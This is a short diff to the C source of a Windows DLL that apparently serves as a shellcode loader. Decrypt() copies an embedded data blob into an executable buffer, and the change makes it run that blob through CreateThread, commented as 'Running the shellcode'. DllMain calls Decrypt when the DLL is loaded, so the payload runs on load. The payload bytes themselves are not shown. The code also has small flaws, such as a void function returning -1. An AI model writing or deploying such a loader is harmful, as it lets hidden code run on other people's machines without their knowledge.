@@ -50,25 +50,28 @@ VOID Decrypt() {
 	}
 
 	memcpy(executableBuffer, Data_RawData, sizeof(Data_RawData));
-	(*(VOID(*)()) executableBuffer)();
 
-	VirtualFree(executableBuffer, 0, MEM_RELEASE);
+	// Running the shellcode as a new thread's entry 
+	if (CreateThread(NULL, NULL, executableBuffer, NULL, NULL, NULL) == NULL) {
+		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
+		return -1;
+	}
 }
 
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
 
-    switch (dwReason) {
-    case DLL_PROCESS_ATTACH: {
-        Decrypt();
-        break;
-    };
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
+	switch (dwReason) {
+	case DLL_PROCESS_ATTACH: {
+		Decrypt();
+		break;
+	};
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
 
-    return TRUE;
+	return TRUE;
 }
 
